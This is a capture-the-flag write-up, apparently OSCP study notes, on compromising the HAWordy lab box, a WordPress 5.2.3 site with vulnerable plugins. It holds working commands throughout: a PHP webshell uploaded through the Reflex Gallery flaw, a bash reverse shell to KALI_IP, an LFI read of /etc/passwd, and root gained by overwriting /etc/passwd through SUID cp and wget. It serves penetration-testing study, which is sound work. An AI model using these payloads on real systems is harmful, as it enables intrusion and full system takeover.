# HAWordy — Proving Grounds

> [!abstract] Summary
> HAWordy has a single open port — HTTP on 80 — running WordPress 5.2.3 with numerous vulnerable plugins. Content discovery reveals a `/wordpress` directory and a `notes.txt` hint. WPScan identifies the **Reflex Gallery 3.1.3** plugin, which has an unauthenticated arbitrary file upload vulnerability. Uploading a PHP webshell through the vulnerable endpoint gives code execution as `www-data`. Privilege escalation abuses a **SUID `/bin/cp`** binary — copying `/root/proof.txt` to a readable location, or overwriting `/etc/passwd` to add a root-level user.

**Target:** `192.168.143.23`

## Methodology

1. Port scan — only port 80 open (Apache 2.4.29 on Ubuntu).
2. Directory enumeration discovers `/wordpress`, `notes.txt`, and `info.php`.
3. WPScan enumerates plugins — finds Reflex Gallery 3.1.3, Mail Masta 1.0, Site Editor 1.1.1, Slideshow Gallery 1.4.6, and others.
4. Exploit Reflex Gallery arbitrary file upload to drop a PHP webshell.
5. Execute a reverse shell as `www-data`.
6. Enumerate SUID binaries — find `/bin/cp` with SUID set.
7. Abuse SUID `cp` to read `/root/proof.txt` or overwrite `/etc/passwd` for root.

## Initial Foothold

### Exploit Research

Search for exploits targeting the identified plugins:

```
searchsploit wordpress reflex gallery
```

The Reflex Gallery 3.1.3 plugin has an **unauthenticated arbitrary file upload** vulnerability (EDB-36374). The vulnerable endpoint is:

```
/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
```

This endpoint accepts file uploads via a `qqfile` multipart POST parameter without requiring authentication, and stores the uploaded files in the WordPress uploads directory.

### Uploading a Webshell

Create a simple PHP webshell:

```php
<?php echo system($_GET['c'])?>
```

Save it as `webshell.php`.

Create an HTML form to submit the upload (or use curl):

```html
<form method="POST" action="http://192.168.143.23/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2022&Month=03" enctype="multipart/form-data">
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Upload">
</form>
```

Host it locally and upload the webshell:

```
php -S 127.0.0.1:8080
```

Alternatively, use curl to upload directly:

```
curl -F "qqfile=@webshell.php" "http://192.168.143.23/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2022&Month=03"
```

### Verifying Code Execution

Access the uploaded shell:

```
curl "http://192.168.143.23/wordpress/wp-content/uploads/2022/03/webshell.php?c=id"
```

Expected output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

Start a listener on Kali:

```
nc -lvnp 4444
```

Trigger the reverse shell through the webshell:

```
curl "http://192.168.143.23/wordpress/wp-content/uploads/2022/03/webshell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"
```

We now have a shell as `www-data`.

> [!note] Alternative Foothold — Mail Masta LFI
> The Mail Masta plugin also has an LFI vulnerability that can be used to read files:
> ```
> curl "http://192.168.143.23/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
> ```
> This confirms the LFI works but does not directly give code execution on this box. The Reflex Gallery upload is the cleaner path to a shell.

## Privilege Escalation

### SUID Enumeration

After obtaining a shell as `www-data`, enumerate SUID binaries:

```
find / -perm -u=s -type f -print 2>/dev/null
```

The output includes standard SUID binaries plus two unusual entries:

```
/usr/bin/wget
/bin/cp
```

Both `/bin/cp` and `/usr/bin/wget` having the SUID bit set is non-standard and exploitable.

### SUID `cp` — Read Root Files

The simplest path is to use the SUID `cp` to copy root-owned files to a readable location:

```
cd /tmp
cp /root/proof.txt /tmp/proof.txt
cat /tmp/proof.txt
```

This works because `cp` runs as root (SUID) and creates a copy readable by the current user.

### SUID `cp` — Full Root Shell (Alternative)

For a full root shell, overwrite `/etc/passwd` with a new root-level user:

Generate a password hash on Kali:

```
openssl passwd -1 -salt hacker hacker123
```

Output:

```
$1$hacker$TzyKlv0/R/c28R.GAeLw.1
```

On the target, copy `/etc/passwd` and append a new root user:

```
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
```

Then switch to the new user:

```
su hacker
# Password: hacker123
```

You now have a root shell.

### SUID `wget` — Alternative Path

The SUID `wget` binary can also overwrite `/etc/passwd`:

```
# On Kali, host the modified passwd file
python3 -m http.server 80

# On target
wget http://KALI_IP/passwd -O /etc/passwd
```

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | WPScan plugin enumeration | WordPress plugins are the primary attack surface — enumerate all of them |
| Foothold | Reflex Gallery arbitrary upload | Unauthenticated file upload is a critical vulnerability — always check searchsploit for identified plugins |
| Privilege Escalation | SUID `cp` / `wget` abuse | Non-standard SUID binaries are immediate escalation vectors — always run `find / -perm -u=s` |

- Multiple plugins on this box are vulnerable (Mail Masta LFI, Site Editor LFI, Reflex Gallery upload, WP Support Plus auth bypass). In an OSCP exam, pick the most reliable path — the arbitrary file upload is the cleanest.
- SUID binaries like `cp` and `wget` that can write arbitrary files give trivial root by overwriting `/etc/passwd`.
- Always check GTFOBins for any unusual SUID/sudo binaries.
